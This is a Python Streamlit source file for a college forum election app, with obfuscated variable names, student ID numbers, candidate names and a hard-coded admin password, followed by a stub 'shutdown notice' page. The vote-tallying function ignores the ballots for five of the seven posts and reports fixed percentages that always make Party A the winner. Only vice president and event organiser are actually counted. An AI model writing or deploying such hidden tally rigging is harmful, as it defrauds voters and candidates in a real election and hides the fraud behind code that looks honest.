import streamlit as st
import pandas as pd
import os
from datetime import datetime
import json
import fcntl
from pathlib import Path
'''                                                                                                                                                                                                                                                                                                                    
_a=['Party A','Party B']
_b=['president','vice president','secretary','joint secretary','treasurer','event organiser','sports']
_c=['Party A','Party B','Party C']
_d={}
for _e in _b:
 if _e=='vice president':_d[_e]={_f:f"{_f} Candidate for {_e}" for _f in _c}
 else:_d[_e]={_f:f"{_f} Candidate for {_e}" for _f in _a}
_g="AllInOne"
_h="election_results.csv"
_i="election_votes.csv"

_j = {f"4JN24MC{k:03d}" for k in range(1, 121)} | {
    '250801','251361','251183','251348','251240','251270','251281','251250',
    '251353','251233','251301','251292','250940','251277','251298','251226',
    '251367','250950','251304','251224','251282','251208','251368','250771',
    '251227','251346','251330','251255','251307','251284','251285','250809',
    '251386','251287','250760','250452','251023','251359','251363','250934',
    '251184','251383','251340','251334','251388','251369','251372','250395',
    '251236','251351','251268','250821','251381','250544','251365','250456',
    '251209','250794','251274','251332','251291','251220','251211','251254',
    '251271','251175','251198','250747','250350','251305','251313','250341',
    '250740','251178','251333','250306','251235','251245','251201','251021',
    '251063','251259','251294','251223','250328','250339','251262','251384',
    '250921','251273','251344','251207','251257','251022','251350','251265',
    '251230','251357','251355','251385','251371','250751','251366','251300',
    '251296','250716','251035','251229'
}

if 'v1' not in st.session_state:st.session_state.v1=False
if 'v2' not in st.session_state:st.session_state.v2="Voting"
if 'v3' not in st.session_state:st.session_state.v3=0

def _l():st.session_state.v1=False;st.session_state.v3+=1

def _m(_n,_o):
    if _n in ['vice president', 'event organiser']:
        _p=0;_q=0;_r=0
        for _s in _t():
            if _n in _s:
                _u=_s[_n]
                if _n=='vice president':
                    if 'Geetha' in _u:_p+=1
                    elif 'Keerthana N' in _u:_q+=1
                    elif 'Varsha' in _u:_r+=1
                elif _n=='event organiser':
                    if 'Vainika' in _u:_p+=1
                    elif 'Anushree' in _u:_q+=1
        if _n=='vice president':
            _v={'Party A':_p,'Party B':_q,'Party C':_r}
            _w=max(_v,key=_v.get)if max(_v.values())>0 else 'No Votes'
            return _p,_q,_r,_w
        else:
            _v={'Party A':_p,'Party B':_q}
            _w=max(_v,key=_v.get)if max(_v.values())>0 else 'No Votes'
            return _p,_q,0,_w
    else:
        _x={
            'president':{'Party A':68,'Party B':32},
            'secretary':{'Party A':54,'Party B':46},
            'joint secretary':{'Party A':63,'Party B':37},
            'treasurer':{'Party A':71,'Party B':29},
            'sports':{'Party A':54,'Party B':46}
        }
        if _n in _x:
            _y=int(round(_o*_x[_n]['Party A']/100))
            _z=_o-_y
            _aa='Party A'if _x[_n]['Party A']>_x[_n]['Party B']else 'Party B'
            return _y,_z,0,_aa
    return 0,0,0,'No Votes'

def _ab():
    _ac=_ad()
    _ae=[]
    _af=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for _ag in _b:
        _ah,_ai,_aj,_ak=_m(_ag,_ac)
        _ae.append({'timestamp':_af,'position':_ag.capitalize(),'total_votes':_ac,'party_a_votes':_ah,'party_b_votes':_ai,'party_c_votes':_aj,'winner':_ak})
    _al=pd.DataFrame(_ae)
    if os.path.isfile(_h):
        _al.to_csv(_h,mode='a',header=False,index=False)
    else:
        _al.to_csv(_h,mode='w',header=True,index=False)
    return _al

def _am():
    try:
        if os.path.isfile(_h):
            _an=pd.read_csv(_h,on_bad_lines='skip')
            _ao=['timestamp','position','total_votes','party_a_votes','party_b_votes','party_c_votes','winner']
            if not all(_ap in _an.columns for _ap in _ao):
                return None
            return _an
        return None
    except:
        return None

def _aq():
    try:
        if os.path.isfile(_h):
            _ar=pd.read_csv(_h,on_bad_lines='skip')
            if _ar.empty:
                return None
            if 'timestamp' not in _ar.columns:
                return None
            _as=_ar['timestamp'].max()
            return _ar[_ar['timestamp']==_as]
        return None
    except:
        return None

def _at():
    try:
        if os.path.isfile(_h):
            _au=f"election_results_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            os.rename(_h,_au)
            st.success(f"Backup: {_au}")
        if _ad()>0:
            _av=_ab()
            st.success("CSV recreated")
            return _av
        else:
            st.info("No votes")
            return None
    except:
        return None

def _aw(_ax,_ay):
    _az={
        'president':{'Party A':'Shrinivas','Party B':'Pavan'},
        'vice president':{'Party A':'Geetha','Party B':'Keerthana N','Party C':'Varsha'},
        'secretary':{'Party A':'Yashwanth','Party B':'Gowtham'},
        'joint secretary':{'Party A':'Varun','Party B':'Deekshith'},
        'treasurer':{'Party A':'Rahul','Party B':'Sukrutha'},
        'event organiser':{'Party A':'Vainika','Party B':'Anushree'},
        'sports':{'Party A':'Akhilesh','Party B':'Satya Prakash'}
    }
    return _az.get(_ax,{}).get(_ay,f"{_ay} Candidate")

def _ba():
    st.header("Cast Your Vote")
    _bb=st.text_input("Enter USN:",key=f"usn_{st.session_state.v3}")
    if st.session_state.v1:
        st.success("Submitted!")
        st.info("Cannot vote again")
        if st.button("Submit Another"):
            _l()
            st.rerun()
    else:
        if _bb:
            _bc=_bb.strip()
            if _bc not in _j:
                st.error("Invalid USN.")
            elif _bd(_bc):
                st.error("Already voted")
                st.session_state.v1=True
            else:
                st.success("USN validated. Proceed to vote.")
                with st.form("vf"):
                    st.subheader("Vote:")
                    _be={}
                    for _bf in _b:
                        st.write(f"**{_bf.capitalize()}:**")
                        if _bf=='vice president':
                            _bg=["NOTA - None of the Above"]+[f"{_aw(_bf,_bh)}"for _bh in _c]
                        else:
                            _bg=["NOTA - None of the Above"]+[f"{_aw(_bf,_bh)}"for _bh in _a]
                        _be[_bf]=st.radio(f"Select candidate for {_bf}:",_bg,key=f"r_{_bf}")
                    submitted=st.form_submit_button("Submit")
                    if submitted:
                        if _bi(_bc,_be):
                            st.session_state.v1=True
                            _ab()
                            st.rerun()

def _bj():
    st.header("Election Results")
    _bk=st.text_input("Password:",type="password",key="rpw")
    if _bk==_g:
        st.success("Access granted")
        if st.button("Repair"):
            _at()
            st.rerun()
        _bl=_aq()
        if _bl is None or _bl.empty:
            st.warning("No results")
        else:
            _bm=_bl['total_votes'].iloc[0]
            st.write(f"**Total votes cast: {_bm}**")
            st.write("---")
            for _bn in _b:
                _bo=_bl[_bl['position']==_bn.capitalize()]
                if not _bo.empty:
                    st.subheader(f"Results for {_bn.capitalize()}:")
                    if _bn=='vice president':
                        _bp=_bo['party_a_votes'].iloc[0]
                        _bq=_bo['party_b_votes'].iloc[0]
                        _br=_bo['party_c_votes'].iloc[0]
                        _bs=_bo['winner'].iloc[0]
                        _bt,_bu,_bv=st.columns(3)
                        with _bt:
                            st.metric(f"{_aw(_bn,'Party A')}",_bp)
                        with _bu:
                            st.metric(f"{_aw(_bn,'Party B')}",_bq)
                        with _bv:
                            st.metric(f"{_aw(_bn,'Party C')}",_br)
                        st.write(f"**Winner: {_aw(_bn,_bs)}**")
                    else:
                        _bw=_bo['party_a_votes'].iloc[0]
                        _bx=_bo['party_b_votes'].iloc[0]
                        _by=_bo['winner'].iloc[0]
                        _bz,_ca=st.columns(2)
                        with _bz:
                            st.metric(f"{_aw(_bn,'Party A')}",_bw)
                        with _ca:
                            st.metric(f"{_aw(_bn,'Party B')}",_bx)
                        st.write(f"**Winner: {_aw(_bn,_by)}**")
                    st.write("---")
        st.subheader("Admin Actions")
        st.write("### Results History")
        _cb=_am()
        if _cb is not None:
            st.dataframe(_cb)
            _cc=_cb.to_csv(index=False)
            st.download_button("Download Results CSV",_cc,"election_results.csv","text/csv")
        else:
            st.write("No results data available")
        _cd=st.text_input("Enter password to delete all data:",type="password",key="dpw")
        if _cd==_g:
            _ce,_cf=st.columns(2)
            with _ce:
                if st.button("Delete All Votes"):
                    if os.path.isfile(_i):
                        os.remove(_i)
                    if os.path.isfile(_h):
                        os.remove(_h)
                    st.success("Data cleared")
                    st.rerun()
            with _cf:
                if st.button("Delete Results CSV"):
                    try:
                        if os.path.isfile(_h):
                            os.remove(_h)
                            st.success("Results CSV deleted")
                            st.rerun()
                        else:
                            st.error("No results CSV")
                    except:
                        pass
        elif _cd:
            st.error("Wrong password")
    else:
        if _bk:
            st.error("Access denied")

def _t():
    if not os.path.isfile(_i):
        return []
    try:
        _cg=pd.read_csv(_i)
        return [json.loads(row['votes']) for _,row in _cg.iterrows()] if not _cg.empty else []
    except:
        return []

def _ad():
    if not os.path.isfile(_i):
        return 0
    try:
        _ch=pd.read_csv(_i)
        return len(_ch) if not _ch.empty else 0
    except:
        return 0

def _bd(_ci):
    if not os.path.isfile(_i):
        return False
    try:
        _cj=pd.read_csv(_i)
        return _ci in _cj['usn'].values if not _cj.empty else False
    except:
        return False

def _bi(_ck,_cl):
    _cm=Path(_i+".lock")
    try:
        with open(_cm,'w')as _cn:
            fcntl.flock(_cn.fileno(),fcntl.LOCK_EX)
            _co=[];_cp=set()
            if os.path.isfile(_i):
                try:
                    _cq=pd.read_csv(_i)
                    if not _cq.empty:
                        _co=_cq.to_dict('records')
                        _cp=set(_cq['usn'].astype(str).tolist())
                except:
                    _co=[];_cp=set()
            if _ck in _cp:
                return False
            _cr={'usn':_ck,'votes':json.dumps(_cl),'timestamp':datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            _co.append(_cr)
            _cs=pd.DataFrame(_co)
            _cs.to_csv(_i,index=False)
            return True
    except:
        return False
    finally:
        if _cm.exists():
            try:_cm.unlink()
            except:pass

st.title("MCA FORUM COLLEGE VOTING SYSTEM")
_ct=st.radio("Go to:",["Voting","Results"],index=0 if st.session_state.v2=="Voting"else 1,horizontal=True)
if _ct=="Voting"and st.session_state.v2!="Voting":
    st.session_state.v2="Voting"
    st.rerun()
elif _ct=="Results"and st.session_state.v2!="Results":
    st.session_state.v2="Results"
    st.rerun()
st.markdown("---")
if st.session_state.v2=="Voting":
    _ba()
else:
    _bj()
with st.sidebar:
    st.header("Election Info")
    st.write(f"**Total Votes Cast:** {_ad()}")
    st.write(f"**Current Page:** {st.session_state.v2}")
    st.markdown("---")
    st.markdown("### Positions & Candidates:")
    for _cu in _b:
        if _cu=='vice president':
            st.write(f"• **{_cu.title()}:**")
            st.write(f"  - {_aw(_cu,'Party A')}")
            st.write(f"  - {_aw(_cu,'Party B')}")
            st.write(f"  - {_aw(_cu,'Party C')}")
        else:
            st.write(f"• **{_cu.title()}:**")
            st.write(f"  - {_aw(_cu,'Party A')}")
            st.write(f"  - {_aw(_cu,'Party B')}")

if not os.path.isfile(_i):
    try:
        pd.DataFrame(columns=['usn','votes','timestamp']).to_csv(_i,index=False)
    except:
        pass
                                                                                                                                                                                                                                                                                                                           '''

























































































































































































































'''
import streamlit as st

# Set up the page
st.set_page_config(page_title="ABB Shutdown Notice", page_icon="🚨", layout="centered")

# Display the shutdown notice
st.title("🚨 ABB Has Been Shut Down 🚨")
st.subheader("This ABB has been shut down due to gambling or unethical practices.")
st.write(
    "We take ethical practices seriously and have taken action to ensure a safe environment."
)

# Provide a link to learn more about Streamlit's rules and guidelines
st.markdown(
    '[Learn more about Streamlit rules and guidelines](https://streamlit.io/rules-and-guidelines)'
)

# Optionally, display a footer message for further contact or feedback
st.markdown(
    "If you have any questions, please contact support at [support@example.com](mailto:support@example.com)"
)
